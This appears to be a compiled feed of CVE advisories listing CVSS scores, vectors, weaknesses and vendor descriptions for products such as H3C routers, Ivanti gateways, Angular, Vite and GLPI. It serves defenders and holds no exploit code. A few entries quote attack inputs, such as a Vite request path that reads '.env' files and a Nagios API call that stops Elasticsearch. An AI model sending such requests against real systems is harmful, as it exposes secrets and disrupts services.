A vulnerability classified as critical was found in H3C Magic NX15, Magic NX30 Pro, Magic NX400, Magic R3010 and Magic BE18000 up to V100R014. Affected by this vulnerability is an unknown functionality of the file /api/login/auth of the component HTTP POST Request Handler. The manipulation leads to command injection. The attack needs to be initiated within the local network. The exploit has been disclosed to the public and may be used. It is recommended to upgrade the affected component.

### CVE-2025-24801

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-434` |
| Published | 2025-03-18T18:32:06.401Z |

GLPI is a free asset and IT management software package. An authenticated user can upload and force the execution of *.php files located on the GLPI server. This vulnerability is fixed in 10.0.18.

### CVE-2024-12992

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:L/SC:L/SI:L/SA:L/S:N/AU:Y/R:U/V:C/RE:M/U:Amber` |
| Weaknesses | `CWE-77` |
| Published | 2025-03-17T09:21:39.002Z |

Improper Neutralization of Special Elements used in a Command vulnerability allows OS Command Injection via RCE. 

This issue affects Pandora FMS from 700 to 777.6

.

### CVE-2024-12971

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:L/SC:L/SI:L/SA:L/S:N/AU:Y/R:U/V:C/RE:L/U:Green` |
| Weaknesses | `CWE-77` |
| Published | 2025-03-17T09:19:31.761Z |

Improper Neutralization of Special Elements used in a Command vulnerability allows OS Command Injection.This issue affects Pandora FMS from 700 to 777.6

### CVE-2024-48248

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-36` |
| Published | 2025-03-04T00:00:00.000Z |

NAKIVO Backup & Replication before 11.0.0.88174 allows absolute path traversal for reading files via getImageByPath to /c/router (this may lead to remote code execution across the enterprise because PhysicalDiscovery has cleartext credentials).

### CVE-2024-28995

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2024-06-06T09:01:23.314Z |

SolarWinds Serv-U was susceptible to a directory transversal vulnerability that would allow access to read sensitive files on the host machine.

### CVE-2024-24919

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2024-05-28T18:22:19.401Z |

Potentially allowing an attacker to read certain information on Check Point Security Gateways once connected to the internet and enabled with remote Access VPN or Mobile Access Software Blades. A Security fix that mitigates this vulnerability is available.

### CVE-2023-48782

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:X/RC:X` |
| Weaknesses | `CWE-78` |
| Published | 2023-12-13T06:37:42.217Z |

A improper neutralization of special elements used in an os command ('os command injection') in Fortinet FortiWLM version 8.6.0 through 8.6.5 allows attacker to execute unauthorized code or commands via specifically crafted http get request parameters

### CVE-2023-32315

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` |
| Weaknesses | `CWE-22` |
| Published | 2023-05-26T22:33:07.974Z |

Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0). Users are advised to upgrade. If an Openfire upgrade isn’t available for a specific release, or isn’t quickly actionable, users may see the linked github advisory (GHSA-gw42-f939-fhvm) for mitigation advice.

### CVE-2022-43939

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H` |
| Weaknesses | `CWE-647` |
| Published | 2023-04-03T18:10:32.141Z |

Hitachi Vantara Pentaho Business Analytics Server versions before 9.4.0.1 and 9.3.0.2, including 8.3.x contain security restrictions using non-canonical URLs which can be circumvented.

### CVE-2023-26360

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2023-03-23T00:00:00.000Z |

Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue does not require user interaction.

### CVE-2025-44824

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H` |
| Weaknesses | `CWE-863` |
| Published | 2025-10-07T00:00:00.000Z |

Nagios Log Server before 2024R1.3.2 allows authenticated users (with read-only API access) to stop the Elasticsearch service via a /nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch call. The service stops even though "message": "Could not stop elasticsearch" is in the API response. This is GL:NLS#474.

### CVE-2024-32114

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:H` |
| Weaknesses | `CWE-1188` |
| Published | 2024-05-02T08:29:18.219Z |

In Apache ActiveMQ 6.x, the default configuration doesn't secure the API web context (where the Jolokia JMX REST API and the Message REST API are located).
It means that anyone can use these layers without any required authentication. Potentially, anyone can interact with the broker (using Jolokia JMX REST API) and/or produce/consume messages or purge/delete destinations (using the Message REST API).

To mitigate, users can update the default conf/jetty.xml configuration file to add authentication requirement:
<bean id="securityConstraintMapping" class="org.eclipse.jetty.security.ConstraintMapping">
  <property name="constraint" ref="securityConstraint" />
  <property name="pathSpec" value="/" />
</bean>

Or we encourage users to upgrade to Apache ActiveMQ 6.1.2 where the default configuration has been updated with authentication by default.


### CVE-2021-39144

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94;CWE-502` |
| Published | 2021-08-23T00:00:00.000Z |

XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### CVE-2026-41049

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-303` |
| Published | 2026-06-22T16:16:35.413 |

Incorrect caching of authentication between different users of the  qSnapper dbus service before version 1.3.3 allowed any local attacker to use dbus functions after a privileged users has authenticated for them.

### CVE-2026-41048

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-303` |
| Published | 2026-06-22T16:16:35.260 |

Incorrect caching of authentication between different polkit methods in qSnapper before version 1.3.3 allowed a local attacker to use functions like "restore from snapshot" even if only allowed to do "delete snapshot".

### CVE-2025-11700

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:L/SA:L` |
| Weaknesses | `CWE-611` |
| Published | 2025-11-12T15:30:38.691Z |

N-central versions < 2025.4 are vulnerable to multiple XML External Entities injection leading to information disclosure

### CVE-2024-5009

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2024-06-25T19:58:48.237Z |

In WhatsUp Gold versions released before 2023.1.3, an Improper Access Control vulnerability in Wug.UI.Controllers.InstallController.SetAdminPassword allows local attackers to modify admin's password.

### CVE-2024-4978

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-506` |
| Published | 2024-05-23T01:56:37.946Z |

Justice AV Solutions Viewer Setup 8.3.7.250-1 contains a malicious binary when executed and is signed with an unexpected authenticode signature. A remote, privileged threat actor may exploit this vulnerability to execute of unauthorized PowerShell commands.

### CVE-2026-54264

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200;CWE-359` |
| Published | 2026-06-22T16:16:39.057 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.1, 21.2.17, and 20.3.25, an information disclosure vulnerability exists in the @angular/service-worker package of the Angular framework. When the Service Worker fetches assets, it preserves metadata (such as headers) from the original request. However, on cross-origin redirects, the Service Worker fails to strip sensitive headers, violating the Fetch redirect algorithm. This allows a remote attacker to obtain sensitive credentials (e.g., Authorization tokens, Proxy-Authorization credentials, or session cookies) by triggering a cross-origin redirect to an untrusted external origin. This vulnerability is fixed in 22.0.1, 21.2.17, and 20.3.25.

### CVE-2024-22024

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L` |
| Weaknesses | `N/A` |
| Published | 2024-02-13T04:07:04.355Z |

An XML external entity or XXE vulnerability in the SAML component of Ivanti Connect Secure (9.x, 22.x), Ivanti Policy Secure (9.x, 22.x) and ZTA gateways which allows an attacker to access certain restricted resources without authentication.

### CVE-2022-1471

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` |
| Weaknesses | `CWE-20` |
| Published | 2022-12-01T10:47:07.203Z |

SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.

### CVE-2026-11833

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-319` |
| Published | 2026-06-23T02:16:30.917 |

Overview: 
A vulnerability has been found in FAST/TOOLS and CI Server. The web server may return a response containing the CI Server setting information. This information could 
be exploited by an attacker for other attacks. 

The affected products and versions are as follows:

FAST/TOOLS (Packages: RVSVRN, UNSVRN, HMIWEB, FTEES, HMIMOB) R9.01 to R10.04

CI Server (All packages) R1.01 to R1.04

### CVE-2026-48502

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-125;CWE-190;CWE-407;CWE-409;CWE-470;CWE-502;CWE-674;CWE-789;CWE-1188` |
| Published | 2026-06-22T22:16:47.147 |

MessagePack for C# is a MessagePack serializer for C#. Prior to 2.5.301 and 3.1.7, MessagePackReader.ReadDateTime() can allocate stack memory based on an attacker-controlled MessagePack extension length. In the slow path for timestamp extension parsing, the computed tokenSize includes the extension body length from the wire and is used in a stackalloc operation before the extension length is validated as one of the valid timestamp sizes. A very small payload can claim a large timestamp extension body and cause a stack allocation large enough to trigger an uncatchable StackOverflowException, terminating the host process. This vulnerability is fixed in 2.5.301 and 3.1.7.

### CVE-2026-48109

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-06-22T22:16:46.617 |

MessagePack for C# is a MessagePack serializer for C#. Prior to 2.5.301 and 3.1.7, A vulnerability exists in the optional LZ4 decompression path used by MessagePack compression modes Lz4Block and Lz4BlockArray. The decoder implementation is based on a deprecated fast-decompression algorithm that does not take a source-length bound. A remote attacker can send a crafted MessagePack payload with manipulated LZ4 token/length fields to force out-of-bounds reads from the compressed input buffer. In affected environments, this can trigger an AccessViolationException during decompression, causing process termination (denial of service). Under some conditions, limited unintended memory disclosure from over-read data may also be possible before failure. This vulnerability is fixed in 2.5.301 and 3.1.7.

### CVE-2026-54271

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-94` |
| Published | 2026-06-22T18:16:45.610 |

protobufjs-cli is the command line add-on for protobuf.js. Prior to 1.3.2 and 2.5.0, a previous fix for unsafe name handling in pbjs static / static-module code generation was incomplete. Affected versions of protobufjs-cli could still emit unsafe JavaScript references when generating static output from crafted JSON descriptor input. The common case of parsing schemas from .proto files is not affected. This is a bypass of CVE-2026-44295. An attacker who can provide or influence pre-parsed JSON descriptors passed to pbjs static code generation may be able to cause generated JavaScript output to contain attacker-controlled code. The injected code may execute if the generated file is later executed or imported and an affected generated API path is invoked. This vulnerability is fixed in 1.3.2 and 2.5.0.

### CVE-2026-53571

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-200` |
| Published | 2026-06-22T18:16:44.667 |

Vite is a frontend tooling framework for JavaScript. Prior to 8.0.16, 7.3.5, and 6.4.3, the contents of files that are specified by server.fs.deny can be returned to the browser on Windows. Vite’s dev server denies direct access to sensitive files through server.fs.deny, including entries such as .env, .env.*, and *.{crt,pem}. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied. Because of this, requests such as /.env::$DATA?raw are treated as allowed paths, while Windows resolves them to the original file's default data stream. Similar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them. This vulnerability is fixed in 8.0.16, 7.3.5, and 6.4.3.

### CVE-2026-50171

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-400;CWE-834` |
| Published | 2026-06-22T18:16:42.533 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23, a Denial of Service (DoS) vulnerability exists in the @angular/common package of Angular. The formatNumber function, which is also utilized by DecimalPipe, PercentPipe, and CurrencyPipe, does not properly validate the upper bounds of the digitsInfo parameter. Specifically, the minimum and maximum fraction digits parsed from the digitsInfo string (e.g., 1.2-4) are converted to integers and used without limits. When parsing a maliciously crafted digitsInfo string with excessively large fraction digit values (e.g., 1.200000000-200000000), the internal roundNumber function attempts to pad the digits array to match the requested fraction size. This results in an unbounded loop that repeatedly pushes elements into an array.  This vulnerability is fixed in 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23.

### CVE-2026-50170

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-524` |
| Published | 2026-06-22T18:16:42.403 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23, a vulnerability was discovered in @angular/common when Server-Side Rendering (SSR) and hydration are enabled. The HttpTransferCache utility optimizes hydration by caching outgoing HTTP requests performed during SSR and transferring the cached state to the client-side application via TransferState. However, the caching mechanism fails to inspect the withCredentials flag or the Cookie header of outgoing requests. As a result, credentialed, user-specific responses may be cached by default in the shared TransferState payload. When these responses are serialized into the HTML, any caching layer (such as a CDN, reverse proxy, or shared server cache) that caches the SSR-rendered HTML page could inadvertently cache and leak one user's private data to other users, leading to a high-severity information disclosure vulnerability. This vulnerability is fixed in 22.0.0-rc.2, 21.2.15, 20.3.22, and 19.2.23.

### CVE-2026-54268

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-400;CWE-1333` |
| Published | 2026-06-22T16:16:39.590 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.1, 21.2.17, and 20.3.25, a Denial of Service (DoS) vulnerability exists in the @angular/common package of the Angular framework. The formatDate function, which is also utilized by the standard Angular DatePipe, does not properly limit or validate the length of the format parameter. When parsing a maliciously crafted, excessively long date format string (e.g., a repeating pattern or very large string), the internal parser splits the string iteratively using a regular expression loop. This results in uncontrolled resource consumption (high CPU utilization and excessive memory allocations), leading to a Denial of Service (DoS). This vulnerability is fixed in 22.0.1, 21.2.17, and 20.3.25.

### CVE-2025-58360

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` |
| Weaknesses | `CWE-611` |
| Published | 2025-11-25T20:17:35.254Z |

GeoServer is an open source server that allows users to share and edit geospatial data. From version 2.26.0 to before 2.26.2 and before 2.25.6, an XML External Entity (XXE) vulnerability was identified. The application accepts XML input through a specific endpoint /geoserver/wms operation GetMap. However, this input is not sufficiently sanitized or restricted, allowing an attacker to define external entities within the XML request. This issue has been patched in GeoServer 2.25.6, GeoServer 2.26.3, and GeoServer 2.27.0.

### CVE-2025-3648

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-1220` |
| Published | 2025-07-08T16:07:11.803Z |

A vulnerability has been identified in the Now Platform that could result in data being inferred without authorization. Under certain conditional access control list (ACL) configurations, this vulnerability could enable unauthenticated and authenticated users to use range query requests to infer instance data that is not intended to be accessible to them.

To assist customers in enhancing access controls, ServiceNow has introduced additional access control frameworks in Xanadu and Yokohama, such as Query ACLs, Security Data Filters and Deny-Unless ACLs.

Additionally, in May 2025, ServiceNow delivered to customers a security update that is designed to enhance customer ACL configurations.

Customers, please review the KB Articles in the References section.

### CVE-2024-51544

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-15` |
| Published | 2024-12-05T12:48:32.801Z |

Service Control vulnerabilities allow access to service restart requests and vm configuration settings. 
Affected products:


ABB ASPECT - Enterprise v3.08.02; 
NEXUS Series v3.08.02; 
MATRIX Series v3.08.02

### CVE-2024-37397

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `N/A` |
| Published | 2024-09-12T01:09:56.254Z |

An External XML Entity (XXE) vulnerability in the provisioning web service of Ivanti EPM before 2022 SU6, or the 2024 September update allows a remote unauthenticated attacker to leak API secrets.

### CVE-2024-38653

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` |
| Weaknesses | `N/A` |
| Published | 2024-08-14T02:38:00.149Z |

XXE in SmartDeviceServer in Ivanti Avalanche 6.3.1 allows a remote unauthenticated attacker to read arbitrary files on the server.

### CVE-2024-21893

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `N/A` |
| Published | 2024-01-31T17:51:35.095Z |

A server-side request forgery vulnerability in the SAML component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) and Ivanti Neurons for ZTA allows an attacker to access certain restricted resources without authentication.

### CVE-2023-6549

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` |
| Weaknesses | `CWE-119` |
| Published | 2024-01-17T20:15:53.345Z |

Improper Restriction of Operations within the Bounds of a Memory Buffer in NetScaler ADC and NetScaler Gateway allows Unauthenticated Denial of Service and Out-Of-Bounds Memory Read

### CVE-2023-46805

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `N/A` |
| Published | 2024-01-12T17:02:16.452Z |

An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks.

### CVE-2023-41266

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:N/C:H/I:L/PR:N/S:U/UI:N` |
| Weaknesses | `N/A` |
| Published | 2023-08-29T00:00:00.000Z |

A path traversal vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows an unauthenticated remote attacker to generate an anonymous session. This allows them to transmit HTTP requests to unauthorized endpoints. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.

### CVE-2023-25827

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2023-05-03T18:36:14.126Z |


Due to insufficient validation of parameters reflected in error messages by the legacy HTTP query API and the logging endpoint, it is possible to inject and execute malicious JavaScript within the browser of a targeted OpenTSDB user. This issue shares the same root cause as CVE-2018-13003, a reflected XSS vulnerability with the suggestion endpoint.



### CVE-2021-32648

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-287` |
| Published | 2021-08-26T19:00:12.000Z |

octobercms in a CMS platform based on the Laravel PHP Framework. In affected versions of the october/system package an attacker can request an account password reset and then gain access to the account using a specially crafted request. The issue has been patched in Build 472 and v1.1.5.

### CVE-2026-44271

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-06-22T20:16:29.090 |

Dell Wyse Management Suite (WMS), versions prior to WMS 2605, contain an Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability. A low privileged attacker with remote access could potentially exploit this vulnerability, leading to Unauthorized access.

### CVE-2026-55388

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94;CWE-1321` |
| Published | 2026-06-22T18:16:47.930 |

piscina is a node.js worker pool implementation. Prior to 6.0.0-rc.2, 5.2.0, and 4.9.3, piscina's constructor and run() paths read the filename option via plain member access. Both reads fall through the prototype chain when the caller's options object doesn't have filename as an own property. When Object.prototype.filename is polluted upstream the inherited value flows to worker_threads.Worker import and the attacker's .mjs runs in the worker. This vulnerability is fixed in 6.0.0-rc.2, 5.2.0, and 4.9.3.

### CVE-2026-9072

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-06-22T16:16:43.500 |

IBM i 7.6, 7.5, 7.4, and 7.3, IBM WebSphere Application Server, and IBM WebSphere Application Server Liberty - when using Intelligent Management with the WebSphere WebServer Plug-in component - are vulnerable to remote code execution and denial of service. This vulnerability can be exploited when an attacker impersonates backend servers and sends crafted responses to the plug-in.

### CVE-2026-41045

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-367` |
| Published | 2026-06-22T16:16:34.873 |

A time-to-check-time-of-use in polkit authentication of qSnapper before version 1.3.3 allowed a local attacker to bypass qSnappers authentication mechanism and operate e.g. as root user.

### CVE-2026-12628

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-798` |
| Published | 2026-06-22T16:16:34.230 |

IBM Storage Protect Client 8.1.0.0 through 8.2.1.0 and IBM Storage Protect Snapshot For Windows 8.1.0.0 through 8.2.1.0 could allow a remote attacker to bypass authentication due to the use of a hardcoded credential in the FlashCopy Manager (FCM) authentication mechanism. The application contains a static credential embedded in multiple authentication code paths, and does not properly validate authentication responses, which may allow an unauthenticated attacker to establish a trusted session and access protected services. This vulnerability affects client components across multiple versions and may allow an attacker to impersonate legitimate clients, potentially leading to unauthorized access to system resources.

### CVE-2025-40536

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-693` |
| Published | 2026-01-28T07:30:09.503Z |

SolarWinds Web Help Desk was found to be susceptible to a security control bypass vulnerability that if exploited, could allow an unauthenticated attacker to gain access to certain restricted functionality.

### CVE-2025-24365

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2025-01-27T17:49:57.796Z |

vaultwarden is an unofficial Bitwarden compatible server written in Rust, formerly known as bitwarden_rs. Attacker can obtain owner rights of other organization. Hacker should know the ID of victim organization (in real case the user can be a part of the organization as an unprivileged user) and be the owner/admin of other organization (by default you can create your own organization) in order to attack. This vulnerability is fixed in 1.33.0.

### CVE-2024-40638

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-11-15T18:06:36.649Z |

